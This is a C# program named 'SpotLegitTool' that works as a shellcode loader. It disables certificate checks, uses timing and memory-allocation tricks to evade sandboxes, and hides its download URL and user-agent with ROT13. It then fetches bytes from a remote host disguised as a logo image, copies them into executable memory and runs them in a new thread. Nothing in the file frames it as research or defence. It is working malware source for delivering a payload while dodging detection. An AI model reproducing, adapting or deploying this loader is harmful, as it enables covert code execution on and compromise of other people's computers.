using System.Text;
using System.Linq;
using System;
﻿
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

namespace SpotLegitTool
{
    class Program
    {
        static void Main(string[] args)
        {
            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(AcceptAllCertifications);

            DateTime t1 = DateTime.Now;
            capivara.azul.Win32.Sleep(11000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;

            if (t2 < 10.5)
            {
                return;
            }

            IntPtr result = capivara.azul.Win32.FlsAlloc(IntPtr.Zero);
            if ((int)result == -1)
            {
                return;
            }
            else
            {
                IntPtr mem = capivara.azul.Win32.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
                if (mem == IntPtr.Zero)
                {
                    return;
                }
                else
                {
                    int tT = 99999999;
                    int mX = 0;
                    for (int i = 0; i < tT; i++)
                    {
                        mX++;
                    }

                    if (mX == tT)
                    {
                        capivara.azul.Win32.Sleep(15000);

                        string url = new string("uggcf://192.168.168.11:8080/vzt/ybtb.cat".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray());
                        WebClient wc = new WebClient();
                        wc.Headers.Add(new string("hfre-ntrag".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()), new string("Zbmvyyn/5.0 (Jvaqbjf AG 10.0; Jva64; k64) NccyrJroXvg/537.36 (XUGZY, yvxr Trpxb) Puebzr/42.0.2311.135 Fnsnev/537.36 Rqtr/12.246".Select(xAZ => (xAZ >= 'a' && xAZ <= 'z') ? (char)((xAZ - 'a' + 13) % 26 + 'a') : ((xAZ >= 'A' && xAZ <= 'Z') ? (char)((xAZ - 'A' + 13) % 26 + 'A') : xAZ)).ToArray()));

                        byte[] SpotLegitTool = wc.DownloadData(url);
                        int size = SpotLegitTool.Length;

                        IntPtr addr = capivara.azul.Win32.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, (uint)SpotLegitTool.Length, 0x3000, 0x40, 0);
                        //IntPtr addr = capivara.azul.Win32.VirtualAlloc(IntPtr.Zero, (uint)SpotLegitTool.Length, 0x3000, 0x40);
                        
                        capivara.azul.Win32.Sleep(3000);

                        Marshal.Copy(SpotLegitTool, 0, addr, size);

                        IntPtr hThread = capivara.azul.Win32.CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                        capivara.azul.Win32.WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                }
            }
        }

        private static bool AcceptAllCertifications(object sender, X509Certificate certification, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }
    }
}
